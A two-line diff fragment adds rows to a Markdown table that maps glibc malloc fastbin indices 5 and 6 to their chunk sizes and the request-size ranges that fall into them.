+| Fastbins[idx=5, size=0x60]   | 0x70      | [0x59,0x68] , [89,104]                | [0x70,0x7f]     |
+| Fastbins[idx=6, size=0x70]   | 0x80      | [0x69,0x78] , [105,120]               | [0x80,0x8f]     |
